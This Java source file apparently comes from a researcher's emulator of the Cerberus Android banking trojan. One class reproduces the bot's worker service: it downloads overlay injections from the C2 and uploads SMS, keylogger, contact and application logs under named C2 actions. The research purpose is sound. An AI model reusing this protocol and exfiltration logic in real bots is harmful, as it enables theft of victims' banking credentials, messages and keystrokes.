/*
 * Copyright (C) 2021 Max 'Libra' Kersten [@Libranalysis, https://maxkersten.nl]
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package cerberus.commands;

import bot.IBot;
import cerberus.bot.CerberusBot;
import java.time.LocalDateTime;
import org.json.JSONObject;

/**
 * This class represents the worker service that is present in the bot. It
 * uploads data to the C2, if the settings allow it
 *
 * @author Max 'Libra' Kersten [@Libranalysis, https://maxkersten.nl]
 */
public class ServiceWorkingWhile {

    /**
     * The instance of the bot
     */
    private CerberusBot bot;

    /**
     * This class represents the worker service that is present in the bot. It
     * uploads data to the C2, if the settings allow it
     *
     * @param bot the bot
     * @param idBot the ID of the bot
     * @param tick the tick variable, which is raised by 8 every time this class
     * is executed
     * @param accessibility a string representation of the boolean that defines
     * @throws Exception if anything goes wrong
     */
    public ServiceWorkingWhile(CerberusBot bot, String idBot, int tick, String accessibility) throws Exception {
        this.bot = bot;
        bot.addLog("Started the \"workingWhile\" service, which is responsible for uploading logs to the C2, based upon prior set values in the shared preferences");

        //----------donwload injections------
        if (bot.getPhone().getSharedPreferences().read("whileStartUpdateInection").equals("1")) {

            bot.addLog("Starting to download injections, as the shared preference key named \"whileStartUpdateInection\" equals \"1\"");

            String[] arrayInjection = bot.getPhone().getSharedPreferences().read("arrayInjection").split(":");
            int intExitInj = 0;
            for (int i = 0; i < arrayInjection.length; i++) {
                if ((!arrayInjection[i].isEmpty() && (!arrayInjection[i].equals("||no||")))) {
                    if (bot.getPhone().getSharedPreferences().read(arrayInjection[i]).isEmpty()) {
                        String htmlBase64Inj = downloadInjection(arrayInjection[i]);

                        if (htmlBase64Inj.length() > 10) {
                            bot.getPhone().getSharedPreferences().write(arrayInjection[i], htmlBase64Inj);
                            bot.addLog("The base64 HTML injection for \"" + arrayInjection[i] + "\" equals:\n" + htmlBase64Inj + "\n");
                        } else {
                            bot.addLog("Failed to download the injection for \"" + arrayInjection[i] + "\"");
                            intExitInj++;
                        }

                        String htmlBase64Icon = downloadIcon(arrayInjection[i]);
                        if (htmlBase64Icon.length() > 10) {
                            bot.getPhone().getSharedPreferences().write("icon_" + arrayInjection[i], htmlBase64Icon);
                            bot.addLog("The base64 HTML injection icon for \"" + arrayInjection[i] + "\" equals:\n" + htmlBase64Icon + "\n");
                        }
                    }
                }
            }
            if (intExitInj == 0) {
                bot.getPhone().getSharedPreferences().write("whileStartUpdateInection", "");
                bot.addLog("All injections have been downloaded succesfully!");
            }
        }

        //------------Upload Logs Injection------
        String getListIdInjection = bot.getPhone().getSharedPreferences().read("listSaveLogsInjection");
        if (!getListIdInjection.isEmpty()) {
            String[] arrayList = getListIdInjection.split(":");
            for (int i = 0; i < arrayList.length; i++) {
                if (!arrayList[i].isEmpty()) {
                    String send = bot.getPhone().getSharedPreferences().read(arrayList[i]);
                    if (sendLogsInjection(arrayList[i], send, idBot).equals("ok")) {
                        removeStringFromSetting("listSaveLogsInjection", arrayList[i] + ":");
                    }
                }
            }
        }

        //--------------Send Logs SMS------------
        String getLogSMS = bot.getPhone().getSharedPreferences().read("LogSMS");
        if (!getLogSMS.isEmpty()) {
            if (sendLogsSMS(getLogSMS, idBot).equals("ok")) {
                if (bot.getPhone().getSharedPreferences().read("LogSMS").length() > getLogSMS.length()) {
                    removeStringFromSetting("LogSMS", getLogSMS);
                } else {
                    bot.getPhone().getSharedPreferences().write("LogSMS", "");
                }
            }
        }
        //--------------Send Logs Keylogger------------
        String getLogKeylogger = bot.getPhone().getSharedPreferences().read("dataKeylogger");
        if (!getLogKeylogger.isEmpty()) {
            if (sendLogsKeylogger(getLogKeylogger, idBot).equals("ok")) {
                bot.getPhone().getSharedPreferences().write("dataKeylogger", "");
            }
        }
        //-------------Send Logs Contacts---------------
        String logsContacts = bot.getPhone().getSharedPreferences().read("logsContacts");
        if (!logsContacts.isEmpty()) {
            if (sendLogsContacts(logsContacts, idBot).equals("ok")) {
                bot.getPhone().getSharedPreferences().write("logsContacts", "");
            }
        }

        //-------------Send Logs Saved SMS---------------
        String logsSavedSMS = bot.getPhone().getSharedPreferences().read("logsSavedSMS");
        if (!logsSavedSMS.isEmpty()) {
            if (sendLogsSavedSMS(logsSavedSMS, idBot).equals("ok")) {
                bot.getPhone().getSharedPreferences().write("logsSavedSMS", "");
            }
        }
        //-------------Send Logs Applications---------------
        String logsApplications = bot.getPhone().getSharedPreferences().read("logsApplications");
        if (!logsApplications.isEmpty()) {
            if (sendLogsApplications(logsApplications, idBot).equals("ok")) {
                bot.getPhone().getSharedPreferences().write("logsApplications", "");
            }
        }

        //----------------Hidden SMS---------------
        if (bot.getPhone().isLocked()) {
            if ((bot.getPhone().getSharedPreferences().read("hiddenSMS").equals("1") || ((bot.getPhone().getSharedPreferences().read("day1PermissionSMS").equals("1")) && (Integer.parseInt(bot.getPhone().getSharedPreferences().read("schetBootReceiver")) >= 11)))) {
                if (!bot.isDefaultSmsManager()) { //Hidden SMS
                    bot.getPhone().getSharedPreferences().write("autoClick", "1");
                    bot.setDefaultSmsManager(true);
                }
            } else {

                if (bot.isDefaultSmsManager()) { // return
                    bot.getPhone().getSharedPreferences().write("autoClick", "1");//auto click start!
                    bot.setDefaultSmsManager(false);

                }
            }

            if (bot.isDefaultSmsManager()) {
                if (bot.getPhone().getSharedPreferences().read("day1PermissionSMS").equals("1")) {
                    bot.getPhone().getSharedPreferences().write("day1PermissionSMS", "");
                }
            }

        }

        //----------------Stop Sound------------------
        if (bot.getPhone().getSharedPreferences().read("offSound").equals("1")) {
            //utl.stopSound(context);
            bot.addLog("Bot turned audio off");
        }
        //---------Kill Application---------------------
        if (bot.getPhone().isLocked()) {
            String nameAppKill = bot.getPhone().getSharedPreferences().read("killApplication");
            if (!nameAppKill.isEmpty()) {
                bot.getPhone().getSharedPreferences().write("autoClick", "1");
                bot.getPhone().getSharedPreferences().write("kill", "dead");

                bot.addLog("The application with the name \"" + nameAppKill + "\" is to be turned off on the device");
            }
        }

        //-------------timeInjecting--------------------
        if (!bot.getPhone().getSharedPreferences().read("arrayInjection").isEmpty()) {
            //-------------timeBanks--------------------
            int timeInj = Integer.parseInt(bot.getPhone().getSharedPreferences().read("timeInject"));
            if ((tick > timeInj) && (timeInj != -1) && (timeInj != -2)) {
                if (timeInjectionsSendPanel("banks", idBot).equals("ok_banks")) {
                    bot.getPhone().getSharedPreferences().write("timeInject", "-2");
                }
            }
            //-------------timeCC--------------------
            int timeCC = Integer.parseInt(bot.getPhone().getSharedPreferences().read("timeCC"));
            if ((tick > timeCC) && (timeCC != -1) && (timeCC != -2)) {
                if (timeInjectionsSendPanel("grabCC", idBot).equals("ok_grabCC")) {
                    bot.getPhone().getSharedPreferences().write("timeCC", "-2");
                }
            }
            //-------------timeMails--------------------
            int timeMails = Integer.parseInt(bot.getPhone().getSharedPreferences().read("timeMails"));
            if ((tick > timeMails) && (timeMails != -1) && (timeMails != -2)) {
                if (timeInjectionsSendPanel("grabMails", idBot).equals("ok_grabMails")) {
                    bot.getPhone().getSharedPreferences().write("timeMails", "-2");
                }
            }
        }
        //--------------------auto off protect------------------------
        //0 means "Application verification function disabled."
        //1 means "The application check function is enabled."
        //2 means "A general error has occurred."
        bot.getPhone().getSharedPreferences().write("checkProtect", "0");

        if (accessibility.equals("1") && (bot.getPhone().isLocked())) {
            if (bot.getPhone().getSharedPreferences().read("checkProtect").equals("1")) {
                if (tick > Integer.parseInt(bot.getPhone().getSharedPreferences().read("timeProtect"))) {
                    bot.getPhone().getSharedPreferences().write("goOffProtect", "1");
                }
            }
        }

        tick += 8;
        bot.getPhone().getSharedPreferences().write("timeWorking", "" + tick);
        bot.addLog("Added 8 to the shared preference key named \"timeWorking\", which now equals " + tick);

        bot.addLog("Ended the \"workingWhile\" service, which is responsible for uploading logs to the C2, based upon prior set values in the shared preferences");
    }

    /**
     * A helper function that contains the code to post data to the C2
     *
     * @param nameInj the inject name
     * @param postMessage the parameter for the post request that contains the
     * command
     * @return the response from the C2
     * @throws Exception if the HTTP request fails
     */
    private String download(String nameInj, String postMessage) throws Exception {
        JSONObject json = new JSONObject();
        json.put("inject", nameInj);
        String param = postMessage + bot.getEncryptionHandler().encrypt(json.toString());
        return bot.getConnector().post(bot.getUrl(), param);
    }

    /**
     * Downloads an injection based on the given name
     *
     * @param nameInj the injection to download
     * @return the downloaded inject
     * @throws Exception if the HTTP request fails
     */
    private String downloadInjection(String nameInj) throws Exception {
        bot.addLog("Downloading the injection for \"" + nameInj + "\"");

        String postMessage = "action=getinj&data=";
        return download(nameInj, postMessage);
    }

    /**
     * Downloads an icon based on the given name
     *
     * @param nameInj the injection icon to download
     * @return the downloaded icon
     * @throws Exception if the HTTP request fails
     */
    private String downloadIcon(String nameInj) throws Exception {
        bot.addLog("Downloading the icon for \"" + nameInj + "\"");

        String postMessage = "action=geticon&data=";
        return download(nameInj, postMessage);
    }

    /**
     * Removes a string from the given setting's value
     *
     * @param key the key to read the value from
     * @param partialValue the partial value to remove
     */
    private void removeStringFromSetting(String key, String partialValue) {
        String getParams = bot.getPhone().getSharedPreferences().read(key);
        getParams = getParams.replace(partialValue, "");
        bot.getPhone().getSharedPreferences().write(key, getParams);
    }

    /**
     * Uploads the log to the C2
     *
     * @param injectionId the injection id
     * @param data the log data
     * @param idbot the ID of the bot
     * @return the response from the C2
     * @throws Exception if the HTTP request fails
     */
    private String sendLogsInjection(String injectionId, String data, String idbot) throws Exception {
        bot.addLog("Sending the injection log to the C2");

        JSONObject request = new JSONObject();
        JSONObject jObject = new JSONObject(data);

        request.put("idbot", idbot);
        request.put("idinject", injectionId);
        request.put("application", jObject.getString("application"));
        request.put("logs", jObject.getString("data"));

        return bot.sendData("action=sendInjectLogs&data=", request);
    }

    /**
     * Gets the date and time from the device, in the format "yyyy-mm-dd HH:mm"
     *
     * @return the device's time on the moment of calling this function
     */
    private String getDateTime() {
        LocalDateTime today = LocalDateTime.now();
        return today.getYear() + "-" + today.getMonthValue() + "-" + today.getDayOfMonth() + " " + today.getHour() + ":" + today.getMinute();
    }

    /**
     * Send the SMS logs to the C2
     *
     * @param logs the logs to upload
     * @param idbot the ID of the bot
     * @return the response from the C2
     * @throws Exception if the HTTP request fails
     */
    private String sendLogsSMS(String logs, String idbot) throws Exception {
        bot.addLog("Sending the SMS log to the C2");

        JSONObject request = new JSONObject();
        request.put("idbot", idbot);
        request.put("logs", logs);
        request.put("date", getDateTime());

        return bot.sendData("action=sendSmsLogs&data=", request);
    }

    /**
     * Sends the saved SMS log to the C2
     *
     * @param logs the logs to upload
     * @param idbot the ID of the bot
     * @return the response from the C2
     * @throws Exception if the HTTP request fails
     */
    private String sendLogsSavedSMS(String logs, String idbot) throws Exception {
        bot.addLog("Sending the saved SMS log to the C2");

        JSONObject request = new JSONObject();
        request.put("idbot", idbot);
        request.put("logs", logs);
        return bot.sendData("action=sendListSavedSMS&data=", request);
    }

    /**
     * Sends the saved heylogger log to the C2
     *
     * @param logs the logs to upload
     * @param idbot the ID of the bot
     * @return the response from the C2
     * @throws Exception if the HTTP request fails
     */
    private String sendLogsKeylogger(String logs, String idbot) throws Exception {
        bot.addLog("Sending the keylogger log to the C2");

        JSONObject request = new JSONObject();
        request.put("idbot", idbot);
        request.put("logs", logs);

        return bot.sendData("action=sendKeylogger&data=", request);
    }

    /**
     * Sends the saved contacts log to the C2
     *
     * @param logs the logs to upload
     * @param idbot the ID of the bot
     * @return the response from the C2
     * @throws Exception if the HTTP request fails
     */
    private String sendLogsContacts(String logs, String idbot) throws Exception {
        bot.addLog("Sending the contact log to the C2");

        JSONObject request = new JSONObject();
        request.put("idbot", idbot);
        request.put("logs", logs);

        return bot.sendData("action=sendListPhoneNumbers&data=", request);
    }

    /**
     * Sends the saved application log to the C2
     *
     * @param logs the logs to upload
     * @param idbot the ID of the bot
     * @return the response from the C2
     * @throws Exception if the HTTP request fails
     */
    private String sendLogsApplications(String logs, String idbot) throws Exception {
        bot.addLog("Sending the application log to the C2");

        JSONObject request = new JSONObject();
        request.put("idbot", idbot);
        request.put("logs", logs);
        return bot.sendData("action=sendListApplications&data=", request);
    }

    /**
     * Sends the saved injection data to the C2
     *
     * @param logs the logs to upload
     * @param idbot the ID of the bot
     * @return the response from the C2
     * @throws Exception if the HTTP request fails
     */
    private String timeInjectionsSendPanel(String nameInject, String idbot) throws Exception {
        bot.addLog("Sending the time injection log to the C2 for \"" + nameInject + "\"");

        JSONObject request = new JSONObject();
        request.put("idbot", idbot);
        request.put("inject", nameInject);
        return bot.sendData("action=timeInject&data=", request);
    }
}
